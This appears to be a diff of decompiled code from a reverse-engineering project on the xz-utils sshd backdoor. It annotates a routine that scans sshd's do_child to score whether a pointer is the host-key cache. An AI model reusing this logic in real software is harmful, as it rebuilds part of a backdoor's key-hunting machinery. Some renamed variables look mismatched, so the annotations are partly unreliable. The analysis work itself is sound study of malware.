@@ -5,7 +5,10 @@
 
 
 /*
- * AutoDoc: Counts characteristic memory accesses to the candidate `sensitive_data` pointer inside `do_child` and produces a confidence score. The aggregate scorer uses this value to decide whether the pointer is safe to treat as the real host-key cache.
+ * AutoDoc: Uses the string-reference catalogue to find `do_child`, then counts how often it dereferences
+ * the candidate pointer at offsets 0 and +0x10. A hit on the base yields one point, and seeing
+ * multiple accesses to the +0x10 slot adds up to two more, producing a score that reflects how
+ * tightly the child process manipulates the structure.
  */
 #include "xzre_types.h"
 
@@ -18,10 +21,12 @@ int sshd_get_sensitive_data_score_in_do_child
   u8 *code_end;
   BOOL BVar1;
   long lVar2;
-  dasm_ctx_t *pdVar3;
+  u8 **ppuVar3;
   uint uVar4;
   byte bVar5;
-  dasm_ctx_t local_80;
+  dasm_ctx_t insn_ctx;
+  u8 *do_child_start;
+  u8 *do_child_end;
   
   bVar5 = 0;
   uVar4 = 0;
@@ -30,17 +35,18 @@ int sshd_get_sensitive_data_score_in_do_child
     code_end = (u8 *)refs->entries[1].func_end;
     BVar1 = find_instruction_with_mem_operand(code_start,code_end,(dasm_ctx_t *)0x0,sensitive_data);
     uVar4 = (uint)(BVar1 != 0);
-    pdVar3 = &local_80;
+    ppuVar3 = &do_child_start;
     for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
-      *(undefined4 *)&pdVar3->instruction = 0;
-      pdVar3 = (dasm_ctx_t *)((long)pdVar3 + (ulong)bVar5 * -8 + 4);
+      *(undefined4 *)ppuVar3 = 0;
+      ppuVar3 = (u8 **)((long)ppuVar3 + (ulong)bVar5 * -8 + 4);
     }
     BVar1 = find_instruction_with_mem_operand
-                      (code_start,code_end,&local_80,(void *)((long)sensitive_data + 0x10));
+                      (code_start,code_end,(dasm_ctx_t *)&do_child_start,
+                       (void *)((long)sensitive_data + 0x10));
     if (BVar1 != 0) {
       BVar1 = find_instruction_with_mem_operand
-                        (local_80.instruction + local_80.instruction_size,code_end,(dasm_ctx_t *)0x0
-                         ,(void *)((long)sensitive_data + 0x10));
+                        (do_child_end + (long)do_child_start,code_end,(dasm_ctx_t *)0x0,
+                         (void *)((long)sensitive_data + 0x10));
       if (BVar1 == 0) {
         uVar4 = uVar4 + 1;
       }
